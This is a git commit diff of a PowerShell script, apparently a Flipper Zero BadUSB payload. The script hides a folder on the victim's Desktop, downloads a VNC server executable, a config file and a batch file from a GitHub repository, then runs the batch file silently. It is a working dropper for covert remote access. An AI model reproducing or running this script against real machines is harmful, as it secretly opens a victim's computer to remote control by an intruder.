304c978f0c1eaf5a62f5a3a867d7ddddaf5b6c52
TriPaGonski <122581754+TriPaGonski@users.noreply.github.com>
2024-06-02 23:55:44 +0200

    Update your-script.ps1

--- your-script.ps1
+++ your-script.ps1
@@ -1,9 +1,13 @@
-# Define the hidden folder path
-$hiddenFolderPath = "$env:APPDATA\Microsoft\inentor"
+Start-Sleep -Seconds 4
 
-# Create the hidden folder
-New-Item -ItemType Directory -Path $hiddenFolderPath -Force
-Set-ItemProperty -Path $hiddenFolderPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+# Define the folder path on the desktop
+$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'inentor')
+
+# Create the folder
+New-Item -ItemType Directory -Path $desktopPath -Force
+Start-Sleep -Seconds 4
+Set-ItemProperty -Path $desktopPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+Start-Sleep -Seconds 4
 
 # Define URLs for the files to download
 $url1 = "https://github.com/TriPaGonski/VNCFLIPPERZERO/raw/main/winvnc.exe"
@@ -11,14 +15,17 @@ $url2 = "https://raw.githubusercontent.com/TriPaGonski/VNCFLIPPERZERO/main/ultra
 $url3 = "https://raw.githubusercontent.com/TriPaGonski/VNCFLIPPERZERO/main/Main.bat"
 
 # Define the local file paths
-$filePath1 = "$hiddenFolderPath\file1.bat"
-$filePath2 = "$hiddenFolderPath\file2.bat"
-$filePath3 = "$hiddenFolderPath\main.bat"
+$filePath1 = "$desktopPath\winvnc.exe"
+$filePath2 = "$desktopPath\ultravnc.ini"
+$filePath3 = "$desktopPath\main.bat"
 
 # Download the files
 Invoke-WebRequest -Uri $url1 -OutFile $filePath1
+Start-Sleep -Seconds 4
 Invoke-WebRequest -Uri $url2 -OutFile $filePath2
+Start-Sleep -Seconds 4
 Invoke-WebRequest -Uri $url3 -OutFile $filePath3
+Start-Sleep -Seconds 4
 
 # Execute the main.bat file
 Start-Process -FilePath $filePath3 -NoNewWindow
